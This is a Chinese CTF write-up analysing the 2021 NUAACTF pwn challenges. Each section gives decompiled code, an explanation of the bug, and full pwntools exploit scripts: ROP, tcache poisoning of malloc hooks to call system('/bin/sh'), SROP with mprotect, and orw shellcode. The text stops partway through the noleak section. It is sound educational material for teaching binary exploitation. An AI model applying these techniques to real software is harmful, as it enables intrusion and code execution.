# 2021NUAACTF PWN&RE WP详解

阅读量 **700244**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-20 14:30:24

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t010a4b81d4f0e206a4.jpg)

## 前言

这是2021年NUAACTF的pwn题目和部分re的详细分析，官方给的wp只有一句话，我对其进行详细的分析，记录如下，若有错误，请指正。

## PWN -> format (fmt)

###  题目分析

题目没有开pie，环境20.04，ida查看有一个格式化字符串漏洞：

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int fd; // [rsp+4h] [rbp-1Ch]
      void *buf; // [rsp+8h] [rbp-18h]
      char format[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v7; // [rsp+18h] [rbp-8h]
    
      v7 = __readfsqword(0x28u);
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      fd = open("./flag", 0);
      buf = malloc(0x30uLL);
      read(fd, buf, 0x30uLL);
      close(fd);
      read(0, format, 8uLL);
      printf(format);   <----fmt
      free(buf);
      return 0;
    }
    

看到在这里可以泄露栈地址以及栈地址指向的内容，所以经过调试确定偏移后，直接输入`%7$s`就可以输出flag。

## PWN -> tiny (alarm返回值、rop、orw)

###  题目分析

保护只开了NX保护，环境20.04，shellcode不能用，ida查看伪代码：

    
    
    __int64 start()
    {
      signed __int64 v0; // rax
      signed __int64 v1; // rax
    
      sys_alarm();
      v0 = sys_write(1u, s1, 0x24uLL);
      v1 = sys_write(1u, s2, 0x1CuLL);
      return v();
    }
    

程序没有多余的函数还有段，只有四个函数start、vul、alarm、libc_csu_init,程序先alarm然后输出提示信息，输入字符串，在vul函数中存在溢出：

    
    
    __int64 vul()
    {
      signed __int64 v0; // rax
      signed __int64 v1; // rax
      char buf[8]; // [rsp+8h] [rbp-8h] BYREF
    
      v0 = sys_read(0, buf, 0x70uLL);   <---overflow
      v1 = sys_write(1u, s3, 4uLL);
      return 114514LL;
    }
    

没开pie，可以rop，只有一个alarm函数，可能利用过程会用到sys_alarm()。

###  利用思路

题目没有链接系统库和启动文件，ida分析就只有4个函数，有一个栈溢出，可以进行rop，没有libc库，不能获取shell，只能orw去读取flag，能用的rop链有sys_read、sys_write，open可以通过改变rax的值来调用，关键是怎么控制rax的值，vul函数在返回前将rax修改：

    
    
    .text:0000000000401070                 public vul
    .text:0000000000401070 vul             proc near               ; CODE XREF: _start+4D↑p
    .text:0000000000401070
    .text:0000000000401070 buf             = byte ptr -8
    .text:0000000000401070
    .text:0000000000401070 ; __unwind {
    .text:0000000000401070                 endbr64
    .text:0000000000401074                 push    rbp
    .text:0000000000401075                 mov     rbp, rsp
    .text:0000000000401078                 sub     rsp, 10h
    .text:000000000040107C                 lea     rax, [rbp+buf]
    .text:0000000000401080                 mov     rsi, rax        ; buf
    .text:0000000000401083                 mov     edi, 0          ; fd
    .text:0000000000401088                 mov     eax, 0
    .text:000000000040108D                 mov     edx, 70h ; 'p'  ; count
    .text:0000000000401092                 syscall                 ; LINUX - sys_read
    .text:0000000000401094                 nop
    .text:0000000000401095                 nop
    .text:0000000000401096                 nop
    .text:0000000000401097                 mov     edx, 4          ; count
    .text:000000000040109C                 mov     edi, 1          ; fd
    .text:00000000004010A1                 lea     rsi, s3         ; "Bye\n"
    .text:00000000004010A8                 mov     eax, 1
    .text:00000000004010AD                 syscall                 ; LINUX - sys_write
    .text:00000000004010AF                 nop
    .text:00000000004010B0                 nop
    .text:00000000004010B1                 nop
    .text:00000000004010B2                 mov     eax, 1BF52h    <-------rax = 0x1bf52>
    .text:00000000004010B7                 leave
    .text:00000000004010B8                 retn
    .text:00000000004010B8 ; } // starts at 401070
    .text:00000000004010B8 vul             endp
    

所以通过read读入字节数控制rax行不通。思索还有啥能控制rax的呢？果然通过查alarm函数返回值知道，alarm函数返回值通俗的说是距alarm还剩的秒数，这里要控制rax
= 2调用open，就要在alarm剩余两秒的时候调用，函数返回2，同理在alarm剩余1秒的时候调用alarm，rax =
1调用write，实现读取flag。思路可以将栈迁移到bss段，然后在bss段进行orw。  
利用步骤：

  1. 通过栈溢出控制rbp为bss+0x30，返回地址为rop，调用sys_read，将./flag写入bss
  2. 通过alarm设置rax = 2，rop调用sys_open打开./flag文件
  3. rop调用sys_read，将fd（flag）读入bss-0x120处
  4. 通过alarm设置rax = 1，rop调用sys_write输出flag

###  exp

    
    
    from pwn import *
    context.log_level='debug'
    context.terminal = ['/bin/tmux', 'split', '-h']
    sh = process('./tiny')
    
    bss =  0x405000-0x100
    vul = 0x401070
    alarm = 0x401055
    syscall = 0x4010ad
    pop_rdi = 0x401103
    pop_rsi_r15 = 0x401101
    '''
    .text:0000000000401088                 mov     eax, 0
    .text:000000000040108D                 mov     edx, 70h ; 'p'  ; count
    .text:0000000000401092                 syscall                 ; LINUX - sys_read
    '''
    
    edi_0_edx_70_eax_0_syscall = 0x401083
    #gdb.attach(sh)
    #pause()
    sh.recvuntil('pwned!')
    payload = p64(0) + p64(bss+0x30)
    payload += p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(edi_0_edx_70_eax_0_syscall) #0x20  read(0,bss,0x70)
    
    sh.send(payload)
    sh.recvuntil('Bye')
    bp_payload = b'./flag\x00\x00' + b'\x00'*0x28 + p64(vul) + p64(vul) + p64(vul)
    
    sh.sendline(bp_payload)
    
    payload = p64(0) + p64(bss + 0x70)
    payload += p64(alarm) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(syscall) + p64(vul) #0x40  open(bss,0,0)
    sleep(10) # rax = 2 open
    
    sh.send(payload)
    
    sh.recvuntil('Bye')
    sh.recvuntil('Bye')
    payload = p64(0) + p64(bss+0xa8)
    payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x401088) + p64(vul) #0x30 read(3,bss-0x120,0x70)
    sh.send(payload)
    sleep(11)   # rax = 1  write
    #gdb.attach(sh,'b *0x40106d')
    sh.recvuntil('Bye')
    payload = p64(0) + p64(bss)
    payload += p64(alarm) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x40108d) # write(1,bss-0x120,0x70)
    sh.send(payload)
    sh.interactive()
    

###  总结

这个题第一次遇见，只有几个函数，程序编译的时候去掉了startfiles，程序用汇编编写，思路是栈溢出，通过alarm函数的返回值控制rax的值，从而进行orw来读取flag，第一次关注了alarm返回值的作用。

## PWN -> nohook (UAF、edit检测hook、花指令)

###  题目分析

保护全开，漏洞点如下：  
delete函数

    
    
    void delete()
    {
      int v0; // [rsp+Ch] [rbp-4h]
    
      puts("id:");
      v0 = itoll_read();
      if ( v0 <= 31 )
      {
        if ( qword_4080[v0] )
          free((void *)qword_4080[v0]);             // UAF
      }
    }
    

存在UAF，可以在free后仍可操作free块。  
edit函数：

    
    
    __int64 edit()
    {
      __int64 result; // rax
      int v1; // [rsp+14h] [rbp-4h]
    
      puts("id:");
      result = itoll_read();
      v1 = result;
      if ( (unsigned int)result <= 0x1F )
      {
        result = qword_4080[(unsigned int)result];
        if ( result )
          result = read(0, (void *)qword_4080[v1], dword_4180[v1]);
      }
      return result;
    }
    

貌似没啥问题，但是这里可以看到汇编有一些蹊跷，有很多nop。仔细看是花指令隐藏了后面的逻辑：

    
    
    .text:00000000000014D7                 mov     edi, 0          ; fd
    .text:00000000000014DC                 call    _read
    .text:00000000000014E1                 nop
    .text:00000000000014E2                 nop
    .text:00000000000014E3                 nop
    .text:00000000000014E4                 call    $+5
    .text:00000000000014E9                 add     [rsp+18h+var_18], 6
    .text:00000000000014EE                 retn
    .text:00000000000014EF ; ---------------------------------------------------------------------------    .text:00000000000014EF                 mov     rax, cs:off_4018
    

去花后，显现出来真实隐藏的逻辑：

    
    
    __int64 edit()
    {
      __int64 result; // rax
      int v1; // [rsp+14h] [rbp-4h]
    
      puts("id:");
      result = itoll_read();
      v1 = result;
      if ( (unsigned int)result <= 0x1F )
      {
        result = qword_4080[(unsigned int)result];
        if ( result )
        {
          read(0, (void *)qword_4080[v1], dword_4180[v1]);
          if ( *(_QWORD *)off_4018 || (result = *(_QWORD *)off_4020) != 0 ) // *(long long*)freehk!=0||*(long long*)mallochk!=0
          {
            *(_QWORD *)off_4018 = 0LL;
            result = (__int64)off_4020;
            *(_QWORD *)off_4020 = 0LL;
          }
        }
      }
      return result;
    }
    

经过偏移调试，可以知道这里是判断freehook和mallochook是否为0，如果发现不为零就置零，这个操作防止了直接edit修改free/malloc
hook为system。

###  利用方式

存在UAF，可以通过unsortedbin泄露libc，然后构造tcache
attack使得tcache指向system，然后再构造同样大小的tcache指向malloc
hook，此时tcache链表中链接顺序为：mallochook->system。实现了与edit直接修改mallochook为system相同的作用。  
 **利用步骤：**

  1. 申请largebin 然后free进入unsortedbin，泄露libc
  2. 构造tcache attack申请到mallochook
  3. 构造tcache attack使得tcache指向system
  4. free 步骤2中申请到的mallochook，使得mallochook -> system
  5. add(“/bin/sh”)触发mallochook，size为longlong类型，可以size=‘/bin/sh’
  6. get shell

###  总结

题目条件有很明显的为这种利用方式开路，首先delete的UAF，其次size是longlong类型，可以直接malloc(size)
->system(‘/bin/sh’)，题目隐藏了关键nohook的点（花指令），坑点之一就在这，做提前要看仔细了，之后就是巧妙地用free的顺序绕过了edit对malloc/free
hook的检测，其实就是将mallochook的fd指针指向system就能实现和直接用edit修改mallochook的效果，而tcache链表刚好是由fd来链接的，所以可以通过free顺序实现修改mallochook
-> system。

###  exp

    
    
    #utf-8
    from pwn import *
    context.log_level='debug'
    context.terminal = ["/bin/tmux", "sp",'-h']
    
    sh = process('./nohook')
    #sh = remote('47.104.143.202',25997)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def add(size):
      sh.recvuntil('exit')
      sh.sendline('1')
      sh.recvuntil('size:')
      sh.sendline(str(size))
    def dele(idx):
      sh.recvuntil('exit')
      sh.sendline('3')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
    def edit(idx,content):
      sh.recvuntil('exit')
      sh.sendline('4')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
      sh.send(content)
    def show(idx):
      sh.recvuntil('exit')
      sh.sendline('2')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
    
    add(0x420)#0 large bin
    add(0x10)#1
    edit(1,'/bin/sh\x00')
    dele(0) # free to unsorted bin
    show(0) # UAF
    sh.recvuntil('\x7f\x00\x00')
    libcbase = u64(sh.recv(6).ljust(8,b'\x00')) + 0x7f2be7c93000 - 0x7f2be7e7ebe0
    binsh = libcbase + 0x7f7c9aa4c5aa - 0x7f7c9a895000
    
    print hex(libcbase)
    #gdb.attach(sh)
    add(0x30)#2
    add(0x30)#3
    dele(3)
    dele(2)
    edit(2,p64(libcbase+libc.sym['__malloc_hook']-0x10))
    add(0x30)#4 -2 
    add(0x30)#5
    edit(5,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    
    add(0x10)#6
    add(0x10)#7
    dele(7)
    dele(6)
    edit(6,p64(libcbase+libc.sym['__malloc_hook']))
    add(0x10)#8-6
    add(0x10)#9 f
    
    ######### not used
    add(0x10)#10
    add(0x10)#11
    dele(11)
    dele(10)
    edit(10,p64(libcbase+libc.sym['__memalign_hook']))
    add(0x10)#12
    add(0x10)#13
    one=[0xe6c7e,0xe6c81,0xe6c84]
    edit(13,p64(libcbase+one[0])+p64(0x21))
    ########### not used
    
    
    add(0x10)#14
    add(0x10)#15
    dele(15)
    dele(14)
    edit(14,p64(libcbase+libc.sym['system']))
    add(0x10)
    #gdb.attach(sh)
    dele(9) # free_hook -> system
    gdb.attach(sh)
    add(str(binsh-1))
    log.success(hex(libcbase))
    sh.interactive()
    

## PWN -> tanchishe (栈溢出)

###  题目分析

程序开了NX，环境2.31，no pie，no
canary，程序函数比较多，是一个贪吃蛇小游戏，找程序漏洞点不好找，可以换个思路，如果是栈的漏洞，栈溢出很常见，那么造成栈溢出的只能是用户输入，那么程序中用户输入的点就一处，就是在结束游戏的时候让输入用户名，所以ida打开直接找到输入name的地方看看有没有漏洞点：

    
    
    __int64 __fastcall sub_401502(unsigned int a1)
    {
      __int64 result; // rax
      char src[212]; // [rsp+10h] [rbp-100h] BYREF
      int v3; // [rsp+E4h] [rbp-2Ch]
      __int64 v4; // [rsp+E8h] [rbp-28h]
      int v5; // [rsp+F4h] [rbp-1Ch]
      __int64 v6; // [rsp+F8h] [rbp-18h]
      int (**v7)(const char *, ...); // [rsp+100h] [rbp-10h]
      int i; // [rsp+10Ch] [rbp-4h]
    
      v6 = 138464LL;
      i = 0;
      v5 = 0;
      fflush(stdin);
      sub_4014C8();
      sub_401406(10LL, 5LL);
      printf("Your score is in the top five");
      fflush(stdout);
      sub_401406(10LL, 6LL);
      printf("Please enter your name: ");
      fflush(stdout);
      v7 = &printf;
      ((void (__fastcall *)(char *))(&printf + 17308))(src);  <---------stack over------>
      if ( dest )
        free(dest);
      dest = (char *)malloc(0xC8uLL);
      strcpy(dest, src);   <-----------heap over--------->
      result = a1;
      dword_406160 = a1;
      for ( i = 4; i > 0; --i )
      {
        v4 = qword_406120[i];
        v3 = dword_406150[i];
        if ( v3 <= dword_406150[i - 1] )
        {
          result = qword_406120[i - 1];
          if ( result )
            break;
        }
        dword_406150[i] = dword_406150[i - 1];
        qword_406120[i] = qword_406120[i - 1];
        dword_406150[i - 1] = v3;
        result = v4;
        qword_406120[i - 1] = v4;
      }
      return result;
    }
    

这里有两个点，`(&printf + 17308)`是scanf，这里没有限制长度，栈溢出，下面strcpy复制到heap上，造成heap
overflow。

###  利用方法

通过栈溢出就可以完成利用，溢出覆盖返回地址为puts，泄露libc，然后再次返回input name，再次栈溢出rop返回到system

###  exp

    
    
    #utf-8
    from pwn import *
    context.log_level='debug'
    context.terminal = ["/bin/tmux", "sp",'-h']
    sh = process('./tanchishe')
    #sh = remote('47.104.143.202',25997)
    #s = ssh(host='127.0.0.1',user='ctf',password='NUAA2021',port=65500)
    #sh = s.process('/home/ctf/tanchishe')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('./tanchishe')
    
    sh.recvuntil('Continue...')
    sh.send('\n')
    
    sh.recvuntil('Exit')
    sh.send('\n')
    
    sh.recvuntil('1 and 9.')
    sh.send('9')
    
    sh.recv()
    sh.recvuntil(':.......::::::...:::::........::..:::::..::....::\n')
    sh.send('\n')
    
    
    pop_rdi = 0x00000000004030e3
    pop_rsi_r15 = 0x00000000004030e1
    
    gdb.attach(sh,'b *0x40160E')
    sh.recvuntil('your name: ')
    sh.send(b'a'*0xc0 +p64(0xdeadbeef) + p64(0x1f951) + p64(0)*7 + p64(pop_rdi) + p64(elf.got['printf'])+p64(elf.plt['puts']) + p64(0x401502) +b'\n')
    
    
    sh.recvuntil('\xe0')
    libcbase = u64( ( b'\xe0' +  sh.recv(5)).ljust(8,b'\x00') ) - 0x64de0
    log.success(hex(libcbase))
    #pause()
    binsh = libcbase + libc.search('/bin/sh').next()
    log.success(hex(binsh))
    #gdb.attach(sh,'b *0x401737')
    sh.recvuntil('name')
    #gdb.attach(sh,'b *0x401737')
    #
    sh.send(b'a'*0xc0 +p64(0xdeadbeef) + p64(0x1f951) + p64(0)*7 + p64(pop_rdi) + p64(binsh) +p64(0x401757)+p64(elf.plt['system']) + p64(0x401502) +b'\n')
    ##############in ssh change system to orw
    
    sh.interactive()
    #log.success(hex(libcbase))
    

## PWN -> leaf (binary tree、UAF)

###  题目分析

题目给的附件是程序leaf和libc-2.31.so，程序保护全开，运行程序：

    
    
    栖霞山的枫叶红了, 拾起一片枫叶, 写满对你的思念.  
    1. 写下对你的思念.
    2. 交换彼此的思念.
    3. 读一封枫叶的书信.
    4. 扔下这片枫叶.
    5. 让我来切身体会吧.
    6. 重新书写这份思念.
    Your Choice:
    

是不是看见这个菜单就头疼呢？我也是，😄，看看ida伪代码，程序在Init函数增加了沙箱，禁用59号调用，查看下程序逻辑：

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      node *v3; // rax
      unsigned int v5; // [rsp+Ch] [rbp-4h]
    
      Init();
      root[0] = malloc(0x30uLL);
      root[1] = malloc(0x30uLL);
      v3 = (node *)root[1];
      v3->val = 0x7FFFFFFF;
      *(_DWORD *)(root[0] + 40LL) = v3->val;
      puts(&byte_21A8);
      Menu();
      v5 = readi();
      if ( v5 <= 6 )
        __asm { jmp     rax }
      Exit();
    }
    

其实是二叉搜索树的实现，主函数新建了两个二叉搜索树root[0],root[1],经过分析二叉树结构体如下：

    
    
    typedef struct TreeNode {
        struct TreeNode *f, *ch[2];  //father、child node
        int illegal[2]; // 父节点是否非法，在exchange函数置1
        char *confession; // 描述
        int val; // 权值
    } node;
    

add函数输入要插入节点内容和权值，Insert函数实现插入：

    
    
    __int64 __fastcall Insert_localalias(node *a1, const char *a2, unsigned int a3, __int64 a4)
    {
      struct TreeNode *v4; // rbx
      __int64 result; // rax
      int i; // [rsp+2Ch] [rbp-14h]
    
      if ( a1->f )
      {
        for ( i = 0; i <= 1; ++i )
        {
          if ( a1->f->illegal[i] )
          {
            a1->f->ch[i] = 0LL;
            a1->f->illegal[i] = 0;
          }
        }
        result = (unsigned int)a1->f->val;
        if ( a3 != (_DWORD)result )
        {
          if ( (signed int)a3 >= a1->f->val )
            result = Insert_localalias((node *)&a1->f->ch[1], a2, a3, (__int64)a1->f);
          else
            result = Insert_localalias((node *)a1->f->ch, a2, a3, (__int64)a1->f);
        }
      }
      else
      {
        a1->f = (struct TreeNode *)malloc(0x30uLL);
        a1->f->f = (struct TreeNode *)a4;
        a1->f->val = a3;
        v4 = a1->f;
        result = (__int64)strdup(a2);
        v4->confession = (char *)result;
      }
      return result;
    }
    

判断节点是否存在，存在直接递归插入子节点，做小右大，不存在申请后直接复赋值。</br>  
exchange函数：

    
    
    void Exchange()
    {
      struct TreeNode *v0; // rbx
      int value1; // [rsp+Ch] [rbp-24h]
      int value2; // [rsp+10h] [rbp-20h]
      int opt; // [rsp+14h] [rbp-1Ch]
      node *a1; // [rsp+18h] [rbp-18h]
    
      puts(&byte_2110);
      value1 = readi();
      puts(&byte_2130);
      value2 = readi();
      opt = readi();
      a1 = find_localalias((node *)root[now], value1);
      v0 = a1->f;
      v0->illegal[isrson(a1, a1->f)] = 1;
      Link_localalias((node *)root[now ^ 1], value2, opt != 0, a1);
    }
    

函数实现子树间的链接，将子树及其所属子节点全部链接到另一颗子树上，在这个过程中

    
    
    void __fastcall Link_localalias(node *a1, unsigned int a2, unsigned int a3, _QWORD *new_son)
    {
      if ( a1 && (unsigned int)check(a1) )
      {
        if ( a2 == a1->val )
        {
          if ( !a1->ch[a3] )
          {
            a1->ch[a3] = (struct TreeNode *)new_son;
            *new_son = a1;
          }
        }
        else if ( (signed int)a2 >= a1->val )
        {
          Link_localalias(a1->ch[1], a2, a3, new_son);
        }
        else
        {
          Link_localalias(a1->ch[0], a2, a3, new_son);
        }
      }
    }
    

递归link，将新节点link到子树的固定左（0）右（1）子树上，在link之前会检查父节点的孩子结点的父节点是否是自己，不是说明异常，退出

    
    
    __int64 __fastcall check(node *a1)
    {
      int i; // [rsp+14h] [rbp-4h]
    
      for ( i = 0; i <= 1; ++i )
      {
        if ( a1->ch[i] && (unsigned __int16)a1->ch[i]->f != (_WORD)a1 )
          return 0LL;
      }
      return 1LL;
    }
    

这里只检查unsigned short类型，只检查两个字节，可以通过对排列来绕过。  
同时，在exchange过程中会存在UAF，在二叉树链接过程中没有将原子树指针置空导致两个子树都可以指向同一个子树节点导致UAF。</br>  
再看dele函数：

    
    
    struct TreeNode *__fastcall Dele_localalias(node *a1)
    {
      struct TreeNode *result; // rax
    
      result = a1->f;
      if ( a1->f )
      {
        result = (struct TreeNode *)check(a1->f);
        if ( (_DWORD)result )
        {
          Dele_localalias((node *)a1->f->ch);
          Dele_localalias((node *)&a1->f->ch[1]);
          free(a1->f->confession);
          free(a1->f);
          result = a1;
          a1->f = 0LL;
        }
      }
      return result;
    }
    

同样，a1->f->confession没有置空，为二叉树合并链接制造条件，如果置NULL在exchange的时候UAF就不能用了。这里的删除时将子树整体递归free，而不是只删除一个节点。</br>  
菜单选项5是通过异或切换子树,全局变量now控制子树切换。

    
    
    .text:0000000000001C49                 lea     rax, now
    .text:0000000000001C50                 mov     eax, [rax]
    .text:0000000000001C52                 xor     eax, 1
    .text:0000000000001C55                 mov     edx, eax
    .text:0000000000001C57                 lea     rax, now
    .text:0000000000001C5E                 mov     [rax], edx
    .text:0000000000001C60                 jmp     short loc_1C78
    

至此，程序逻辑和漏洞点都理的差不多了

###  利用方式

在find、link、dele的时候都会有检查孩子的父节点是不是当前节点，所以在此之前要通过堆排列进行绕过。

  1. 通过堆排列绕过check，tcache，exchange合并子树，dele其中一个，造成UAF，泄露libc
  2. 通过堆排列绕过check，tcache，exchange造成uaf，free chunk to fastbin 泄露heapbase
  3. 得到free hook、setcontext、mprotect地址
  4. 写入freehook地址，修改free hook为setcontext+61刷新环境（rsp）到堆地址
  5. 通过SOP调用mprotect给内存赋予执行权限，ret跳转到shellcode执行orw读取flag
  6. dele触发shellcode。

传送门：[setcontext](https://github.com/1094093288/IMG/blob/master/Pwn/2021anxunbei/wp.md#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8F%8A%E5%8A%9F%E8%83%BD)、[SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#signal)

###  exp

    
    
    from pwn import * 
    
    
    context.log_level = 'debug'
    context.terminal = ['/bin/tmux', 'split', '-h']
    context.arch = 'amd64'
    sh = process('./leaf')
    #sh = remote('119.45.24.140', 9349)
    
    libc = ELF('/home/xxx/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6')
    #libc = ELF('./libc-2.31.so')
    
    
    def Write(Until, Text, opt = False):
        if not opt:
            sh.sendlineafter(Until, Text)
        else:
            sh.sendafter(Until, Text)
    
    def Add(confession, val):
        Write('Choice:', '1')
        Write('.', confession, opt = True)
        Write('.', str(val))
    
    def Dele(val):
        Write('Choice:', '4')
        Write('.', str(val))
    
    def Exchange(val1, val2, opt):
        Write('Choice:', '2')
        Write('.', str(val1))
        Write('.', str(val2))
        sh.sendline(str(opt))
    
    def Show(val):
        Write('Choice:', '3')
        Write('.', str(val))
    
    def Edit(val, Content):
        Write('Choice:', '6')
        Write('?', str(val))
        Write('.', Content, opt = True)
    
    def Xor():
        Write('Choice:', '5')
    
    # now = 0
    Add('a', 100)
    Add('a', 200)
    Add('a', 2)
    # make heap chunk to bypass check
    for i in range(16): 
        Add('a' * 0xf00, 3 + i)
    Add('a' * 0x930 + '\x00', 20)
    Add('b\x00', 1)
    for i in range(8):
        Add('a' * 0x80 + '\x00', 201 + i) # 21 - 28
    Xor()
    # now = 1
    Add('a', 1000)
    Xor()
    Dele(1)
    # now = 0
    Exchange(201, 1000, 0)
    Xor()
    # now = 1
    Dele(201)
    Xor()
    # now = 0
    Show(201)
    sh.recvuntil('\n')
    libcbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - libc.symbols['__malloc_hook'] - 0x70
    log.success('libcbase: ' + hex(libcbase))
    
    Xor()
    # now = 1
    for i in range(9):
        Add('a' * 0x60 + '\x00', 1001 + i)
    for i in range(16):
        Add('a' * 0xf00 + '\x00', 1500 + i)
    Xor()
    # 0
    Add('a' * 0x3c0 + '\x00', 201)
    Xor()
    # 1
    Add('a' * 0x100 + '\x00', 1517)
    for i in range(7): # fill tcache 
        Add('a' * 0x100 + '\x00', 1600 + i)
    Dele(1600)
    
    Add('a' * 0x300 + '\x00', 5000)
    Add('a' * 0x3c0 + '\x00', 5001) 
    Add('a' * 0x3c0 + '\x00', 5002) 
    Dele(5001)  # tcache[0x3d0]
    Dele(1517)  # free to unsortedbin 
    Xor()
    # now = 0
    # Add('b' * 0x70 + '\x00', 201)
    Exchange(201, 1000, 0)
    Xor()
    # now = 1
    Dele(201)  # note free to fastbin,note's confession to tcache
    Xor()
    # now = 0
    Show(201)
    
    sh.recvuntil('\n')
    heapbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x21e10
    log.success('heapbase: ' + hex(heapbase))
    #gdb.attach(sh)
    free_hook = libc.symbols['__free_hook'] + libcbase
    magic_addr = libcbase + libc.symbols['setcontext'] + 61
    mprotect_addr = libcbase + libc.symbols['mprotect']
    # Exchange_Addr = libcbase + 0x1547a0
    Exchange_Addr = libcbase + 0x0000000000154930 # context+61
    Edit(201, p64(free_hook)[0:6])
    
    Add('a' * 0x3c0 + '\x00', 201)
    
    Add('b' * 0x3c0 + '\x00', 202)
    
    Edit(202, p64(Exchange_Addr))
    
    # orw
    shellcode = ''' 
    mov rax,0x67616c662f2e
    push rax
    mov rdi,rsp
    mov rsi,0
    mov rdx,0
    mov rax,2
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov rdx,1024
    mov rax,0
    syscall
    mov rdi,1
    mov rsi,rsp
    mov rdx,rax
    mov rax,1
    syscall
    mov rdi,0
    mov rax,60
    syscall
    '''
    
    frame = SigreturnFrame()
    frame.rsp = heapbase + 0x10630 + 0x150
    frame.rdi = heapbase
    frame.rsi = 0x20000
    frame.rdx = 4 | 2 | 1
    frame.rip = mprotect_addr
    print str(frame)[0x28:]
    payload = p64(0x12345678) + p64(0x10630 + heapbase + 0x10) + p64(0x0) * 0x4 + p64(magic_addr) + str(frame)[0x28:]
    payload = payload.ljust(0x150, 'a')
    
    gdb.attach(sh)
    Edit(20, payload + p64(heapbase + 0x10630 + 0x158) + asm(shellcode))
    # gdb.attach(sh, 'b * {0}'.format(Exchange_Addr))
    # Dele(201)
    # now = 1
    
    Dele(20)
    
    sh.interactive()
    

###  总结

题目出的新颖，巧妙利用二叉树合并的过程制造UAF漏洞，题目还加了基础check来检测节点是否合法，将栈迁移到堆上进行rop去orw。不能getshell的前提下可以修改freehook为setcontext去在堆上制造orw读取flag。

## PWN -> thread (线程、临界资源)

###  题目分析

ida打开程序可以看到初始balance=1000，当balance>10001的时候，会读取flag，再看sale函数是按原价的9折卖出的，根本不可能大于1000，此时注意到sale函数中

    
    
    void *Sale_Handler(void *arg)
    {
        balance += Size * 90;
        sleep(1);
        Size = 0;
    }
    

加上balance后sleep(1),之后才size =
0，而且程序是用线程处理的，可以实现买一次，在1秒内卖两次就可以使得balance>1000,从而换取读取flag

    
    
    void Buy_Flag()
    {
        if (balance >= 1001)
        {
            int fd = open("./flag", 0);
            char buf[0x30];
            read(fd, buf, 0x30);
            write(1, buf, 0x30);
            close(fd);
            balance -= 1001;
        }
        else
        {
            puts("Your don't have enough money!");
        }
    }
    

###  利用

写脚本，买一次卖两次，之后换取flag

###  exp

存在随机性，多运行几次。

    
    
    from pwn import * 
    
    context.log_level = 'debug'
    sh = process('./thread')
    #sh = remote('119.45.24.140', 9373)
    
    sh.sendline('1')
    sleep(0.05)
    sh.sendline('10')
    sleep(0.05)
    sh.sendline('2')
    #sleep(0.05)
    sh.sendline('2')
    #sleep(0.05)
    sh.sendline('4')
    
    
    sh.interactive()
    

###  总结

拿到题目的时候分析，没有全面的思考，一直在整数溢出的地方尝试，发现不行，没有注意到sale函数的sleep(1)的作用，做题思路一定要发散，不能墨守成规。注意审题！

## PWN -> noleak (堆溢出、close(1)、orw)

###  题目分析

保护全开，环境2.31，题目给了libc和程序，但是发现运行程序没有输出，ida查看：  
init函数：

    
    
    __int64 sub_14A8()
    {
      unsigned int v0; // eax
      int v1; // eax
      __int64 v3; // [rsp+8h] [rbp-8h]
    
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      v0 = time(0LL);
      srand(v0);
      v1 = rand();
      malloc(10 * (v1 % 16) + 16);
      v3 = seccomp_init(0x7FFF0000LL);
      seccomp_rule_add(v3, 0LL, 59LL, 0LL);
      return seccomp_load(v3);
    }
    

随机申请内存，沙箱禁用59号调用。  
程序关闭了标准输出流close(1),main函数：

    
    
    void __fastcall main(__int64 a1, char **a2, char **a3)
    {
      unsigned int v3; // [rsp+Ch] [rbp-4h]
    
      init_0();
      printf("a gift from Asuri: %x\n", (unsigned __int16)&printf);
      puts("in return for the gift, you can't get any output on your screen");
      puts("how can you leak my info this time");
      close(1);    <------close stdout---->
      while ( 1 )
      {
        v3 = sub_1458();
        if ( v3 <= 5 )
          break;
        puts("invalid");
      }
      __asm { jmp     rax }
    }
    

程序输出了libc函数两字节的偏移，程序有add、dele、show、edit功能，后门system(‘/bin/sh’)并没有用。</br>  
add函数只检查了idx<=0x1f,size<=0x60,个数没有限制，也可以重复覆盖添加：

    
    
    int add()
    {
      int result; // eax
      unsigned int size; // [rsp+0h] [rbp-10h]
      unsigned int size_4; // [rsp+4h] [rbp-Ch]
      void *v3; // [rsp+8h] [rbp-8h]
    
      size = sub_1405();
      size_4 = sub_1405();
      if ( size > 0x60 )
        return puts("too big");
      if ( size_4 > 0x1F )
        return puts("out of range");
      ((void (*)(void))((char *)&sub_1318 + 1))();
      v3 = malloc(size);
      readn(v3, size);
      qword_4080[size_4] = v3;
      result = size;
      dword_4180[size_4] = size;
      return result;
    }
    

readn函数:

    
    
    unsigned __int64 __fastcall sub_136E(__int64 a1, unsigned int a2)
    {
      char buf; // [rsp+13h] [rbp-Dh] BYREF
      unsigned int i; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
    
      v5 = __readfsqword(0x28u);
